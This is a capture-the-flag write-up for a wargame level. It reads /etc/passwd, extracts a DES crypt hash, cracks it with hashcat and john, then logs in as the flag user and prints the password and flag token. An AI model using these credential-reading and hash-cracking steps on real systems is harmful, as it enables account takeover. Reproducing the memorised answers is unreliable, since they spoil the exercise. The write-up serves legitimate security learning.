# Level01

### 1. Identity

	$ id
	uid=2001(level01) gid=2001(level01) groups=2001(level01),100(users)

We are logged as level01.

### 2. Home directory

	$ pwd
	/home/user/level01

	$ ls -la
	...

All files here are standard shell configuration files (.bashrc, .profile, etc.) with no exploitable content.

### 3. Searching files owned by our user

	$ find / -user level01 2>/dev/null
	...
	$ find / -user flag01 2>/dev/null

Nothing interesting here.

### 4. Searching password files

	$ ls -l etc/shadow
	-rw-r----- 1 root shadow 4428 Mar  6  2016 etc/shadow

This file does not have the read permissions.

	$ ls -l etc/passwd
	-rw-r--r-- 1 root root 2477 Mar  5  2016 etc/passwd

This file can be read.

	$ cat etc/passwd
	...
	flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
	...

https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/

There is one hashed password only for the user flag01.

Let's decode it.

### 5. Decode hashed password

The password field in /etc/passwd contains a traditional DES-based crypt hash (13 characters).

The first two characters as the salt.

The remaining eleven characters as the encrypted password.

**More information:**

https://man.archlinux.org/man/crypt.5.en#descrypt_(Traditional_DES)

https://tldp.org/HOWTO/Security-HOWTO/password-security.html

Let's crack it !

To extract the file from our vm :

	scp -P 4242 level01@127.0.0.1:/etc/passwd ~/snowcrash/hash.txt

Cracking the hash with hashcat or john :

	hashcat -m 1500 ~/snowcrash/hash.txt /usr/share/wordlists/rockyou.txt
	hashcat -m 1500 ~/snowcrash/hash.txt --show

	john --format=descrypt ~/snowcrash/hash.txt
	john --show ~/snowcrash/hash.txt

Gives you the same result :

	42hDRfypTqqnw:abcdefg

### 6. Getting the flag

	$ su flag01
	Password: abcdefg

	$ getflag
	Check flag.Here is your token : f2av5il02puano7naaf6adaaf

Flag successfully retrieved.
